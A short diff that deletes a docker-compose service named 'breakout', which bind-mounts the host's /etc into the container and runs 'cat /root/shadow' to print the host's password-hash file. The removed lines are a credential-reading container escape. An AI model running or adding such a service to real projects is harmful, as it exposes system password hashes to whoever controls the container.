@@ -1,5 +1,0 @@
-breakout:
-    build: .
-    volumes:
-        - /etc:/root
-    command: cat /root/shadow
